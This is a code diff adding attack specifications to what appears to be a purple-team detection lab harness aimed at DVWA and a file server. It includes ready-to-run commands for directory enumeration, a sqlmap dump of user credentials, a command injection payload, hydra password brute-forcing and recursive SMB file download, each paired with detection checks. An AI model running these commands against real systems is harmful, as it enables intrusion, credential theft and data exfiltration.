@@ -78,6 +78,51 @@ FIRE_SPECS: list[FireSpec] = [
         target_role="fileserver", command="nxc smb {target} -u smbuser -p 'Password123'",
         label="Authenticate with harvested credentials (NetExec)",
     ),
+    # ---- Real web exploitation against DVWA (purpose-built to be exploited) ----
+    FireSpec(
+        action_id="web.dir_enum", tool="gobuster", function="Web content discovery",
+        target_role="web",
+        command="gobuster dir -u http://{target} -w /usr/share/dirb/wordlists/common.txt -q -t 20 -k",
+        detect=_WEB_LOG.format(n=500),
+        label="Enumerate web content/paths (gobuster)",
+    ),
+    FireSpec(
+        action_id="web.sqli", tool="sqlmap", function="SQL injection",
+        target_role="web",
+        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
+                 "sqlmap -u \"http://{target}/vulnerabilities/sqli/?id=1&Submit=Submit\" "
+                 "--cookie=\"$C\" --batch --flush-session --level=1 --risk=1 "
+                 "-D dvwa -T users --dump'"),
+        detect=_WEB_LOG.format(n=500),
+        label="Dump the user table via SQL injection (sqlmap)",
+    ),
+    FireSpec(
+        action_id="web.cmd_injection", tool="curl", function="Command injection (RCE)",
+        target_role="web",
+        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
+                 "curl -s --cookie \"$C\" \"http://{target}/vulnerabilities/exec/\" "
+                 "--data \"ip=127.0.0.1;id;uname -a&Submit=Submit\" "
+                 "| sed -n \"/<pre>/,/<\\/pre>/p\" | sed \"s/<[^>]*>//g\"'"),
+        detect=_WEB_LOG.format(n=200),
+        label="Remote code execution via command injection (curl)",
+    ),
+    FireSpec(
+        action_id="web.brute_force", tool="hydra", function="Online password brute-force",
+        target_role="web",
+        command=("bash -lc 'C=$(dvwa-auth http://{target}); "
+                 "printf \"letmein\\npassword\\nadmin\\n123456\\n\" >/tmp/pw.txt; "
+                 "hydra -l admin -P /tmp/pw.txt {target} http-get-form "
+                 "\"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:"
+                 "Username and/or password incorrect.:H=Cookie\\: $C\" -f -t 4'"),
+        detect=_WEB_LOG.format(n=200),
+        label="Brute-force the login (hydra)",
+    ),
+    FireSpec(
+        action_id="exfil.smb_files", tool="smbclient", function="SMB file exfiltration",
+        target_role="fileserver",
+        command="smbclient //{target}/public -N -c 'prompt OFF; recurse ON; ls; mget *'",
+        label="Browse & download files from the share (smbclient)",
+    ),
     # ---- Windows Active Directory lab (Phase 2) -------------------------------
     FireSpec(
         action_id="cred.lsass", tool="impacket", function="AD credential dump",
